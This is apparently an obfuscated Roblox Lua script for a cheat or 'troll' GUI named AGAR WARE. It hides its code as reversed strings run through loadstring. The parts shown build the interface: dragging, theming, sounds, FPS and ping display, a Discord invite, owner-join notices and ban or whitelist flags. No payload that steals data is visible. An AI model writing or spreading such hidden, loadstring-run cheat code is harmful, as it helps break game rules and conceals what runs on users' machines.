_llza[_sc(52,53,99)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(52,53,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,53,99)][_sc(84,101,120,116)]=[[AGAR WARE]];
_llza[_sc(52,53,99)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,53,100)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(52,53,99)]);
_llza[_sc(52,53,100)][_sc(78,97,109,101)]=_sc(105,110,116,114,111);
_llza[_sc(52,53,101)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,53,99)]);
_llza[_sc(52,53,101)][_sc(67,111,108,111,114)]=Color3.fromRGB(0, 54, 110);
_llza[_sc(52,53,101)][_sc(84,104,105,99,107,110,101,115,115)]=1.9;
_llza[_sc(52,53,101)][_sc(76,105,110,101,74,111,105,110,77,111,100,101)]=Enum.LineJoinMode.Miter;
_llza[_sc(52,53,102)]=Instance.new(_sc(85,73,83,99,97,108,101),_llza[_sc(52,53,98)]);
_llza[_sc(52,53,102)][_sc(83,99,97,108,101)]=1.1;
_llza[_sc(52,54,48)]=Instance.new(_sc(70,111,108,100,101,114),_llza[_sc(49)]);
_llza[_sc(52,54,49)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(52,54,48)]);
_llza[_sc(52,54,49)][_sc(78,97,109,101)]=_sc(76,97,98,101,108,115,84,97,103,115);
_llza[_sc(52,54,50)]=Instance.new(_sc(70,111,108,100,101,114),_llza[_sc(49)]);
_llza[_sc(52,54,51)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(52,54,50)]);
_llza[_sc(52,54,51)][_sc(78,97,109,101)]=_sc(116,99,111,116,111,111,108,114,101,102,114,101,115,104);
_llza[_sc(52,54,52)]=Instance.new(_sc(70,111,108,100,101,114),_llza[_sc(49)]);
_llza[_sc(52,54,53)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(52,54,52)]);
_llza[_sc(52,54,53)][_sc(78,97,109,101)]=_sc(103,108,111,98,97,108,32,108,111,103);
local function C_2()
local script = _llza[_sc(50)];
loadstring(([[dne
dne	
kaerb		
)(gniggarDputes		
dne		
)gniggarDputes(tcennoC:)"elacS"(langiSdegnahCytreporPteG:elacSiu			
neht elacSiu fi		

dne		
dne			
)dne				
dne					
eslaf = gniggard						
neht hcuoT.epyTtupnIresU.munE == epyTtupnIresU.tupni ro 1nottuBesuoM.epyTtupnIresU.munE == epyTtupnIresU.tupni fi					
)tupni(noitcnuf(tcennoC:dednEtupnI.ecivreStupnIresU = nnoCdednEtupni				

)dne				
dne					
)						
elacStnerruc / Y.atled + tesffO.Y.soPtrats							
 ,elacS.Y.soPtrats							
 ,elacStnerruc / X.atled + tesffO.X.soPtrats							
 ,elacS.X.soPtrats							
(wen.2miDU = noitisoP.emarf						
1 ro elacS.elacSiu dna elacSiu = elacStnerruc lacol						
tratSgard - noitisoP.tupni = atled lacol						
neht )hcuoT.epyTtupnIresU.munE == epyTtupnIresU.tupni ro tnemevoMesuoM.epyTtupnIresU.munE == epyTtupnIresU.tupni( dna gniggard fi					
)tupni(noitcnuf(tcennoC:degnahCtupnI.ecivreStupnIresU = nnoCdegnahCtupni				

)dne				
dne					
noitisoP.emarf = soPtrats						
noitisoP.tupni = tratSgard						
eurt = gniggard						
neht hcuoT.epyTtupnIresU.munE == epyTtupnIresU.tupni ro 1nottuBesuoM.epyTtupnIresU.munE == epyTtupnIresU.tupni fi					
)tupni(noitcnuf(tcennoC:nageBtupnI.emarf = nnoCnageBtupni				

eslaf = elbaggarD.emarf				
esle			
eurt = elbaggarD.emarf				
neht 1 == elacs fi			

1 ro elacS.elacSiu dna elacSiu = elacs lacol			

dne )(tcennocsiD:nnoCdednEtupni neht nnoCdednEtupni fi			
dne )(tcennocsiD:nnoCdegnahCtupni neht nnoCdegnahCtupni fi			
dne )(tcennocsiD:nnoCnageBtupni neht nnoCnageBtupni fi			
)(gniggarDputes noitcnuf lacol		

nnoCdednEtupni ,nnoCdegnahCtupni ,nnoCnageBtupni lacol		

soPtrats ,tratSgard lacol		
eslaf = gniggard lacol		
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol		

eurt = evitcA.emarf		
)5.0 ,5.0(wen.2rotceV = tnioProhcnA.emarf		
)0 ,5.0 ,0 ,5.0(wen.2miDU = noitisoP.emarf		
neht )"enosihtsti"(dlihCtsriFdniF:emarf dna "emarFniaM" == emaN.emarf fi	
od ))(nerdlihCteG:iuGneercs(sriap ni emarf ,_ rof

)"ecivreStupnIresU"(ecivreSteG:emag = ecivreStupnIresU lacol
dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
tneraP.tpircs = p lacol	
)(iuGneercSteg noitcnuf lacol]]):reverse())();
end;
task.spawn(C_2);
local function C_3()
local script = _llza[_sc(51)];
loadstring(([[)dne
)(eulBllAetadpu	
)(sroloCetadpu	
)(noitcnuf(tcennoC:)"3roloCdnuorgkcaB"(langiSdegnahCytreporPteG:emarFroloc
)(eulBllAetadpu

dne
dne	
dne		
dne			
roloCtegrat = roloC.jbo				
neht roloCeulb == roloC.jbo fi			
neht )"ekortSIU"(AsI:jbo fiesle		
dne			
roloCtegrat = 3roloCdnuorgkcaB.jbo				
neht roloCeulb == 3roloCdnuorgkcaB.jbo fi			
neht )"nottuBegamI"(AsI:jbo ro )"lebaLegamI"(AsI:jbo ro )"emarFgnillorcS"(AsI:jbo ro )"emarF"(AsI:jbo fiesle		
dne			
roloCtegrat = 3roloCdnuorgkcaB.jbo				
neht roloCeulb == 3roloCdnuorgkcaB.jbo fi			
dne			
roloCtegrat = 3roloCtxeT.jbo				
neht roloCeulb == 3roloCtxeT.jbo fi			
neht )"xoBtxeT"(AsI:jbo ro )"nottuBtxeT"(AsI:jbo ro )"lebaLtxeT"(AsI:jbo fi		
od ))(stnadnecseDteG:iug(sriap ni jbo ,_ rof	
)552 ,321 ,0(BGRmorf.3roloC = roloCeulb lacol	
3roloCdnuorgkcaB.emarFroloc = roloCtegrat lacol	
)(eulBllAetadpu noitcnuf lacol


)dne
)(sroloCetadpu	
)(noitcnuf(tcennoC:)"3roloCdnuorgkcaB"(langiSdegnahCytreporPteG:emarFroloc

)(sroloCetadpu

dne
dne	
dne		
dne			
roloCtegrat = roloC.jbo				
neht )"ekortSIU"(AsI:jbo fiesle			
roloCtegrat = 3roloCdnuorgkcaB.jbo				
neht )"emarF"(AsI:jbo fi			
neht "roloCiuG" == emaN.jbo fi		
od ))(stnadnecseDteG:iug(sriap ni jbo ,_ rof	
3roloCdnuorgkcaB.emarFroloc = roloCtegrat lacol	
)(sroloCetadpu noitcnuf lacol

dne nruter neht emarFroloc ton fi
)"roloC"(dlihCtsriFdniF:iug = emarFroloc lacol
dne nruter neht iug ton fi
)(iuGneercSteg = iug lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
tneraP.tpircs = p lacol	
)(iuGneercSteg noitcnuf lacol]]):reverse())();
end;
task.spawn(C_3);
local function C_4()
local script = _llza[_sc(52)];
loadstring(([[dne
dne	
)434013116439711 ,8 ,"!revres eht ni si tpircs siht fo renwo ehT"(yfitoN.G_		
neht )dIresU.reyalp(renwOeraWragAsI.G_ fi	
od ))(sreyalPteG:sreyalP(sriap ni reyalp ,_ rof


)dne
dne	
)8 ,".revres eht tfel tpircs siht fo renwo ehT"(yfitoN.G_		
neht )dIresU.reyalp(renwOeraWragAsI.G_ fi	
)reyalp(noitcnuf(tcennoC:gnivomeRreyalP.sreyalP

)dne
dne	
)434013116439711 ,8 ,"!revres eht denioj tpircs siht fo renwo ehT"(yfitoN.G_		
neht )dIresU.reyalp(renwOeraWragAsI.G_ fi	
)reyalp(noitcnuf(tcennoC:deddAreyalP.sreyalP

)5.0(tiaw
)"sreyalP"(ecivreSteG:emag = sreyalP lacol


)751704836803931 ,5 ,"diovvraga - tpircs ym gnisu rof uoy knahT"(yfitoN.G_
)3(tiaw.ksat
)01 ,"!etad ot pu yats ot drocsid eht nioj ,ahpla ni llits si tpircs sihT"(yfitoN.G_
)"n\zlaeP@ -n\latneM@ -n\:stiderCn\n\��№№∖⒖� ��⒖⑖∖⒖� ��⒖⑖∖⒖� ��№‖№∖⒖� ��� ��⒖⑖∖⒖� ��⒖⑖∖⒖� ��№№∖⒖� ��⒖⑖∖⒖�n\��‖‖∖⒖� ��№№∖⒖� ��№№∖⒖� ��⒖∖⒖∖⒖� ��� ��№№∖⒖� ��№№∖⒖� ��№⑖∖⒖� ��№№∖⒖�n\��‖‖∖⒖� ��‖‖∖⒖� ��‖‖∖⑖� ��⒖⑖⑖∖⒖� ��� ��‖‖∖⒖� ��‖‖∖⑖� ��‖‖∖⒖� ��‖‖∖⑖�n\tH2VxsaDf7/gg.drocsidn\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\"(tnirp
)1(tiaw.ksat]]):reverse())();
end;
task.spawn(C_4);
local function C_5()
local script = _llza[_sc(53)];
loadstring(([[)dne
dne	
)jbo(dnuoSkcilCdda		
neht )"nottuBegamI"(AsI:jbo ro )"nottuBtxeT"(AsI:jbo fi	
)jbo(noitcnuf(tcennoC:deddAtnadnecseD.iuGneercs

dne
dne	
)jbo(dnuoSkcilCdda		
neht )"nottuBegamI"(AsI:jbo ro )"nottuBtxeT"(AsI:jbo fi	
od ))(stnadnecseDteG:iuGneercs(sriap ni jbo ,_ rof

dne
)dne	
dne		
)xednItluafed ,looPtluafed(dnuoSyalp = xednItluafed			
esle		
)xednItnetnoc ,looPtnetnoc(dnuoSyalp = xednItnetnoc			
neht )nottub(aerAtnetnoCnIsi fi		
)(noitcnuf(tcennoC:kcilC1nottuBesuoM.nottub	
)nottub(dnuoSkcilCdda noitcnuf lacol

dne
eslaf nruter	
dne	
tneraP.p = p		
dne eurt nruter neht aerAtnetnoc == p fi		
od p elihw	
tneraP.jbo = p lacol	
dne eslaf nruter neht aerAtnetnoc ton fi	
)jbo(aerAtnetnoCnIsi noitcnuf lacol

)eurt ,"aeratnetnoc"(dlihCtsriFdniF:iuGneercs = aerAtnetnoc lacol

dne
feRxedni nruter	
dne 1 = feRxedni neht loop# > feRxedni fi	
1 + feRxedni = feRxedni	
)(yalP:]feRxedni[loop	
)feRxedni ,loop(dnuoSyalp noitcnuf lacol

1 = xednItnetnoc lacol
1 = xednItluafed lacol

dne
)s ,looPtnetnoc(tresni.elbat	
)"ecivreSdnuoS"(ecivreSteG:emag = tneraP.s	
3.0 = emuloV.s	
dIdnuoStnetnoc .. "//:ditessaxbr" = dIdnuoS.s	
)"dnuoS"(wen.ecnatsnI = s lacol	
od 5 ,1 = i rof
}{ = looPtnetnoc lacol

dne
)s ,looPtluafed(tresni.elbat	
)"ecivreSdnuoS"(ecivreSteG:emag = tneraP.s	
3.0 = emuloV.s	
dIdnuoStluafed .. "//:ditessaxbr" = dIdnuoS.s	
)"dnuoS"(wen.ecnatsnI = s lacol	
od 5 ,1 = i rof
}{ = looPtluafed lacol

030466933143821 = dIdnuoStnetnoc lacol
258098474093431 = dIdnuoStluafed lacol

dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
tneraP.tpircs = p lacol	
)(iuGneercSteg noitcnuf lacol

]]):reverse())();
end;
task.spawn(C_5);
local function C_b()
local script = _llza[_sc(98)];
loadstring(([[)dne
eurt = txeThciR.txeTeltiT	
txeTstats .. " | 8.ahpla-0.0.3v | ERAW RAGA" = txeT.txeTeltiT	

)	
sreyalPxam		
,tnuoCreyalp		
,gnip		
,SPFdehtooms		
,'>tnof/<d%/d% :revres | smd% | f1.% spf>")081,081,081(bgr"=roloc tnof<'		
(tamrof.gnirts = txeTstats lacol	
	

sreyalPxaM.sreyalP = sreyalPxam lacol	
)(sreyalPteG:sreyalP# = tnuoCreyalp lacol	
	

)0001 * sdnoceSnIgnip(dnuor.htam = gnip lacol	
)(gniPkrowteNteG:reyalPlacoL = sdnoceSnIgnip lacol	
	

gnihtooms * )SPFdehtooms - SPFtnerruc( + SPFdehtooms = SPFdehtooms	
emiTatled / 1 = SPFtnerruc lacol	
won = emiTtsal	
emiTtsal - won = emiTatled lacol	
)(kcit = won lacol	
)(noitcnuf(tcennoC:deppetSredneR.ecivreSnuR

)(kcit = emiTtsal lacol
50.0 = gnihtooms lacol
06 = SPFdehtooms lacol


)eziminiMelggot(tcennoC:kcilC1nottuBesuoM.nottuBeziminiM

dne
dne	
"-" = txeT.nottuBeziminiM		
)		
ffiDthgieh + tesffO.Y.noitisoP.emarFniaM			
 ,elacS.Y.noitisoP.emarFniaM			
 ,tesffO.X.noitisoP.emarFniaM			
 ,elacS.X.noitisoP.emarFniaM			
(wen.2miDU = noitisoP.emarFniaM		
)thgieHlanigiro ,0 ,tesffO.X.eziS.emarFniaM ,elacS.X.eziS.emarFniaM(wen.2miDU = eziS.emarFniaM		

2 / )thgieHraBpot - thgieHlanigiro( = ffiDthgieh lacol		
52 ro tesffO.Y.eziS.raBpoT dna raBpoT = thgieHraBpot lacol		

dne eurt = elbisiV.emarFrennI neht emarFrennI fi		
esle	
"+" = txeT.nottuBeziminiM		
)		
ffiDthgieh - tesffO.Y.noitisoP.emarFniaM			
 ,elacS.Y.noitisoP.emarFniaM			
 ,tesffO.X.noitisoP.emarFniaM			
 ,elacS.X.noitisoP.emarFniaM			
(wen.2miDU = noitisoP.emarFniaM		
)thgieHraBpot ,0 ,tesffO.X.eziS.emarFniaM ,elacS.X.eziS.emarFniaM(wen.2miDU = eziS.emarFniaM		

2 / )thgieHraBpot - thgieHlanigiro( = ffiDthgieh lacol		
		

52 ro tesffO.Y.eziS.raBpoT dna raBpoT = thgieHraBpot lacol		
dne eslaf = elbisiV.emarFrennI neht emarFrennI fi		
neht deziminiMsi fi	
deziminiMsi ton = deziminiMsi	
)(eziminiMelggot noitcnuf lacol

tesffO.Y.eziS.emarFniaM = thgieHlanigiro lacol
eslaf = deziminiMsi lacol

)"rabpot"(dlihCtsriFdniF:emarFniaM = raBpoT lacol
)"emarfrenni"(dlihCtsriFdniF:emarFniaM = emarFrennI lacol

dne nruter neht txeTeltiT ton ro nottuBeziminiM ton ro emarFniaM ton fi

)"txet"(dlihCtsriFdniF:tneraP.tpircs = txeTeltiT lacol
)"esiminim"(dlihCtsriFdniF:tneraP.tpircs = nottuBeziminiM lacol
)"emarFniaM"(dlihCtsriFdniF:iuGneercs = emarFniaM lacol

reyalPlacoL.sreyalP = reyalPlacoL lacol
)"sreyalP"(ecivreSteG:emag = sreyalP lacol
)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol

dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol

dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
tneraP.tpircs = p lacol	
)(iuGneercSteg noitcnuf lacol]]):reverse())();
end;
task.spawn(C_b);
local function C_16()
local script = _llza[_sc(49,54)];
loadstring(([[)"emoH"(egaPhctiws


dne
dne	
)dne		
)emaNegap(egaPhctiws			
)(noitcnuf(tcennoC:kcilC1nottuBesuoM.nottub		
neht nottub fi	
)emaNegap(dlihCtsriFdniF:reniatnoCnottub = nottub lacol	
od semaNegap ni emaNegap ,_ rof


)dne
)(roloCegaPevitcAetadpu	
)(sroloCllAetadpu	
)(noitcnuf(tcennoC:)"3roloCdnuorgkcaB"(langiSdegnahCytreporPteG:emarFroloc

dne
dne	
dne		
roloCtegrat = 3roloCtxeT.txet			
neht txet fi		
)"txet"(dlihCtsriFdniF:nottuBdetceles = txet lacol		
neht nottuBdetceles fi	
)egaPtnerruc(dlihCtsriFdniF:reniatnoCnottub = nottuBdetceles lacol	
)(roloCegaPevitcAetadpu noitcnuf lacol

dne
dne	
)(yalP:)}0 = emuloV{ ,)5.0(wen.ofnIneewT ,cisuMstiderc(etaerC:ecivreSneewT		
esle	
dne		
)(yalP:)}EMULOV_CISUM = emuloV{ ,)5.0(wen.ofnIneewT ,cisuMstiderc(etaerC:ecivreSneewT			
neht )]"cisumetum"[ataDgifnoC.G_ dna ataDgifnoC.G_( ton fi		
neht "stiderC" == emaNegap fi	

dne	
dne		
0 = ycnerapsnarTtxeT.txet			
roloCtegrat = 3roloCtxeT.txet			
neht txet fi		
)"txet"(dlihCtsriFdniF:nottuBdetceles = txet lacol		
GB_EVITCA = 3roloCdnuorgkcaB.nottuBdetceles		
neht nottuBdetceles fi	
)emaNegap(dlihCtsriFdniF:reniatnoCnottub = nottuBdetceles lacol	
	

dne	
eurt = elbisiV.egaPdetceles		
neht egaPdetceles fi	
)emaNegap(dlihCtsriFdniF:aerAtnetnoc = egaPdetceles lacol	
	

dne	
dne		
dne			
0 = ycnerapsnarTtxeT.txet				
TXET_EVITCANI = 3roloCtxeT.txet				
neht txet fi			
)"txet"(dlihCtsriFdniF:nottub = txet lacol			
GB_EVITCANI = 3roloCdnuorgkcaB.nottub			
neht nottub fi		
)eman(dlihCtsriFdniF:reniatnoCnottub = nottub lacol		

dne		
eslaf = elbisiV.egap			
neht egap fi		
)eman(dlihCtsriFdniF:aerAtnetnoc = egap lacol		
od semaNegap ni eman ,_ rof	
	

emaNegap = egaPtnerruCeraWragA.G_	
emaNegap = egaPtnerruc	
)emaNegap(egaPhctiws noitcnuf lacol


)"ecivreSneewT"(ecivreSteG:emag = ecivreSneewT lacol
6.0 = EMULOV_CISUM lacol

"emoH" = egaPtnerruCeraWragA.G_
cisuMstiderc = cisuMstiderCeraWragA.G_
)(yalP:cisuMstiderc
)"ecivreSdnuoS"(ecivreSteG:emag = tneraP.cisuMstiderc
eurt = depooL.cisuMstiderc
0 = emuloV.cisuMstiderc
"54432593922717//:ditessaxbr" = dIdnuoS.cisuMstiderc
)"dnuoS"(wen.ecnatsnI = cisuMstiderc lacol


"emoH" = egaPtnerruCeraWragA.G_

)552 ,552 ,552(BGRmorf.3roloC = TXET_EVITCANI lacol
)02 ,02 ,02(BGRmorf.3roloC = GB_EVITCA lacol
)01 ,01 ,01(BGRmorf.3roloC = GB_EVITCANI lacol


}"stiderC" ,"niaMOCT" ,"sgnitteS" ,"llorT" ,"niaM" ,"emoH"{ = semaNegap lacol


dne nruter neht aerAtnetnoc ton fi
)"aeratnetnoc"(dlihCtsriFdniF:emarFniam = aerAtnetnoc lacol
tneraP.tneraP.reniatnoCnottub = emarFniam lacol
tneraP.tpircs = reniatnoCnottub lacol


)sroloCllAetadpu(tcennoC:)"3roloCdnuorgkcaB"(langiSdegnahCytreporPteG:emarFroloc

dne
3roloCdnuorgkcaB.emarFroloc = roloCtegrat	
)(sroloCllAetadpu noitcnuf lacol

3roloCdnuorgkcaB.emarFroloc = roloCtegrat lacol

dne nruter neht emarFroloc ton fi
)"roloC"(dlihCtsriFdniF:iuGneercs = emarFroloc lacol


dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol

dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
tneraP.tpircs = p lacol	
)(iuGneercSteg noitcnuf lacol
]]):reverse())();
end;
task.spawn(C_16);
local function C_48()
local script = _llza[_sc(52,56)];
loadstring(([[dne
dne	
)0 ,0(wen.2rotceV = noitisoPsavnaC.dlihc		
neht )"emarFgnillorcS"(AsI:dlihc fi	
od ))(nerdlihCteG:tneraP.tpircs(sriap ni dlihc ,_ rof]]):reverse())();
end;
task.spawn(C_48);
local function C_4e()
local script = _llza[_sc(52,101)];
loadstring(([[)}
,eslaf = retfAgniruDkcilCnac	
,2 = tiaWegasseMretfa	
,"!ypoc ot deliaF" = egasseMrorre	
,"!draobpilc ot deipoC" = egasseMretfa	
,dne	
sseccus nruter		

dne		
)3 ,"!knil ypoc ot deliaF"(yfitoN.G_			
esle		
)3 ,"!draobpilc ot deipoc knil drocsiD"(yfitoN.G_			
neht sseccus fi		

)dne		
)"tH2VxsaDf7/gg.drocsid//:sptth"(draobpilctes			
)(noitcnuf(llacp = sseccus lacol		
)(noitcnuf = kcabllac	
,".knil eht ypoc ot ereh sserp ,revres drocsid ym nioJ" = pitloot	
,tpircs = xobpuorg	
,"drocsid" = emarf	
{(nottuBetaerC.G_







dne
)(eziSetadpu	
dne	
)eziSetadpu(tcennoC:)"elacS"(langiSdegnahCytreporPteG:elacSiu		
neht elacSiu fi	
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol	
)eziSetadpu(tcennoC:)"eziStnetnoCetulosbA"(langiSdegnahCytreporPteG:tuoyaLtsiLiu	
dne	
)thgieHdelacs ,0 ,tesffO.X.eziS.xobpuorg ,elacS.X.eziS.xobpuorg(wen.2miDU = eziS.xobpuorg		
elacs / )2 + Y.eziStnetnoc( = thgieHdelacs lacol		
1 ro elacS.elacSiu dna elacSiu = elacs lacol		
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol		
eziStnetnoCetulosbA.tuoyaLtsiLiu = eziStnetnoc lacol		
)(eziSetadpu noitcnuf lacol	
neht tuoyaLtsiLiu fi
dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
xobpuorg = p lacol	
)(iuGneercSteg noitcnuf lacol
)"tuoyaLtsiLIU"(ssalCfOdlihCtsriFdniF:xobpuorg = tuoyaLtsiLiu lacol
tneraP.tpircs = xobpuorg lacol

xobtxeTetaerC.G_ dna elggoTnottuBetaerC.G_ dna nottuBetaerC.G_ dna elggoTetaerC.G_ litnu )(tiaw.ksat taeper]]):reverse())();
end;
task.spawn(C_4e);
local function C_77()
local script = _llza[_sc(55,55)];
loadstring(([[)}
,eslaf = retfAgniruDkcilCnac	
,2 = tiaWegasseMretfa	
,"!ypoc ot deliaF" = egasseMrorre	
,"!draobpilc ot deipoC" = egasseMretfa	
,dne	
sseccus nruter		

dne		
)3 ,"!knil ypoc ot deliaF"(yfitoN.G_			
esle		
)3 ,"!draobpilc ot deipoc knil drocsiD"(yfitoN.G_			
neht sseccus fi		

)dne		
)"tH2VxsaDf7/gg.drocsid//:sptth"(draobpilctes			
)(noitcnuf(llacp = sseccus lacol		
)(noitcnuf = kcabllac	
,".knil eht ypoc ot ereh sserp ,revres drocsid ym nioJ" = pitloot	
,tpircs = xobpuorg	
,"drocsid" = emarf	
{(nottuBetaerC.G_







dne
)(eziSetadpu	
dne	
)eziSetadpu(tcennoC:)"elacS"(langiSdegnahCytreporPteG:elacSiu		
neht elacSiu fi	
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol	
)eziSetadpu(tcennoC:)"eziStnetnoCetulosbA"(langiSdegnahCytreporPteG:tuoyaLtsiLiu	
dne	
)thgieHdelacs ,0 ,tesffO.X.eziS.xobpuorg ,elacS.X.eziS.xobpuorg(wen.2miDU = eziS.xobpuorg		
elacs / )2 + Y.eziStnetnoc( = thgieHdelacs lacol		
1 ro elacS.elacSiu dna elacSiu = elacs lacol		
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol		
eziStnetnoCetulosbA.tuoyaLtsiLiu = eziStnetnoc lacol		
)(eziSetadpu noitcnuf lacol	
neht tuoyaLtsiLiu fi
dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
xobpuorg = p lacol	
)(iuGneercSteg noitcnuf lacol
)"tuoyaLtsiLIU"(ssalCfOdlihCtsriFdniF:xobpuorg = tuoyaLtsiLiu lacol
tneraP.tpircs = xobpuorg lacol

xobtxeTetaerC.G_ dna elggoTnottuBetaerC.G_ dna nottuBetaerC.G_ dna elggoTetaerC.G_ litnu )(tiaw.ksat taeper]]):reverse())();
end;
task.spawn(C_77);
local function C_82()
local script = _llza[_sc(56,50)];
loadstring(([[emaNyalpsiD.reyalp .. " ,emocleW" = txeT.eltit

eurt = elbisiV.eliforp
tnetnoc = egamI.eliforp
)eziSbmuht ,epyTbmuht ,dIresu(cnysAlianbmuhTresUteG:)"sreyalP"(ecivreSteG:emag = tnetnoc lacol
024x024eziS.eziSlianbmuhT.munE = eziSbmuht lacol
tohSdaeH.epyTlianbmuhT.munE = epyTbmuht lacol
dIresU.reyalp = dIresu lacol

etaDdettamrof = txeT.etadnioj
)
egAtnuocca	
 ,yad.etaDnioj	
 ,htnom.etaDnioj	
 ,raey.etaDnioj	
 ,")syad d%( d20%-d20%-d40% ����"(tamrof.gnirts = etaDdettamrof lacol

))00468 * egAtnuocca( - )(emit.so ,"t*"(etad.so = etaDnioj lacol
)"t*"(etad.so = etaDtnerruc lacol
egAtnuoccA.reyalp = egAtnuocca lacol

emaN.reyalp .. "@" = txeT.emanresu

emaNyalpsiD.reyalp = txeT.yalpsid

txet.]"======ELTIT======"[tneraP.tneraP.tpircs = eltit lacol
eliforp.tneraP.tpircs = eliforp lacol
etadnioj.tneraP.tpircs = etadnioj lacol
emanresu.tneraP.tpircs = emanresu lacol
yalpsid.tneraP.tpircs = yalpsid lacol

reyalPlacoL.sreyalP.emag = reyalp lacol]]):reverse())();
end;
task.spawn(C_82);
local function C_a8()
local script = _llza[_sc(97,56)];
loadstring(([[)}
dne	
dne		
)(yortseD:iuGneercs			
neht iuGneercs fi		
)(iuGneercSteg = iuGneercs lacol		

dne		
dne			
tneraP.p = p				
dne p nruter neht )"iuGneercS"(AsI:p fi				
od p elihw			
tneraP.tpircs = p lacol			
)(iuGneercSteg noitcnuf lacol		
		

lin = dennaBDIWHsI.G_		
lin = renwOsI.G_		
lin = detsiletihWsI.G_		
lin = detsilkcalBsI.G_		
lin = stsiLresU.G_		
lin = txeTnottuBteS.G_		
lin = rekciProloCretneC.G_		
lin = ataDgifnoC.G_		
lin = pitlooTediH.G_		
lin = pitlooTwohS.G_		
lin = yfitoN.G_		
lin = rekciProloCetaerC.G_		
lin = nwodporDetaerC.G_		
lin = redilSetaerC.G_		
lin = xobtxeTetaerC.G_		
lin = elggoTnottuBetaerC.G_		
lin = nottuBetaerC.G_		
lin = elggoTetaerC.G_		
		

dne		
dne			
)dne )eulav(lecnac.ksat )(noitcnuf(llacp				
neht "daerht" == )eulav(epyt fi			
			
dne			
)dne )(tcennocsiD:eulav )(noitcnuf(llacp				
neht "noitcennoCtpircSXBR" == )eulav(foepyt dna "atadresu" == )eulav(epyt fi			
			
od )G_(sriap ni eulav ,yek rof		
		
)(noitcnuf = kcabllac	
,7.0 = tiaWmrifnoc	
,"?IUG yortseD" = egasseMmrifnoc	
,eurt = mrifnoCsdeen	
,".stpircs lla spots dna IUG eht syortsed yletelpmoC" = pitloot	
,tpircs = xobpuorg	
,"iugyortsed" = emarf	
{(nottuBetaerC.G_








dne
)(eziSetadpu	
dne	
)eziSetadpu(tcennoC:)"elacS"(langiSdegnahCytreporPteG:elacSiu		
neht elacSiu fi	
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol	
)eziSetadpu(tcennoC:)"eziStnetnoCetulosbA"(langiSdegnahCytreporPteG:tuoyaLtsiLiu	
dne	
)thgieHdelacs ,0 ,tesffO.X.eziS.xobpuorg ,elacS.X.eziS.xobpuorg(wen.2miDU = eziS.xobpuorg		
elacs / )2 + Y.eziStnetnoc( = thgieHdelacs lacol		
1 ro elacS.elacSiu dna elacSiu = elacs lacol		
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol		
eziStnetnoCetulosbA.tuoyaLtsiLiu = eziStnetnoc lacol		
)(eziSetadpu noitcnuf lacol	
neht tuoyaLtsiLiu fi
dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
xobpuorg = p lacol	
)(iuGneercSteg noitcnuf lacol
)"tuoyaLtsiLIU"(ssalCfOdlihCtsriFdniF:xobpuorg = tuoyaLtsiLiu lacol
tneraP.tpircs = xobpuorg lacol

xobtxeTetaerC.G_ dna elggoTnottuBetaerC.G_ dna nottuBetaerC.G_ dna elggoTetaerC.G_ litnu )(tiaw.ksat taeper]]):reverse())();
end;
task.spawn(C_a8);
local function C_c0()
local script = _llza[_sc(99,48)];
loadstring(([[)}
dne	
dne		
roloc = 3roloCdnuorgkcaB.emarFroloc			
neht emarFroloc fi		
)"roloC"(dlihCtsriFdniF:iuGneercs = emarFroloc lacol		
		

dne nruter neht iuGneercs ton fi		
)(iuGneercSteg = iuGneercs lacol		

dne		
dne			
tneraP.p = p				
dne p nruter neht )"iuGneercS"(AsI:p fi				
od p elihw			
tneraP.tpircs = p lacol			
)(iuGneercSteg noitcnuf lacol		
		
)ahpla ,roloc(noitcnuf = kcabllac	
,tpircs = xobpuorg	
,eslaf = ahpla	
,"roloc IUG eht egnahC" = eltit	
,)552 ,321 ,0(BGRmorf.3roloC = tluafed	
,"roloc a kciP" = pitloot	
,"emehtrolociug" = emarfrekciproloc	
,"emehtrolociug" = emarf	
{(rekciProloCetaerC.G_










)}
dne	
delbanEsi = rekciProloCretneC.G_		
)delbanEsi(noitcnuf = kcabllac	
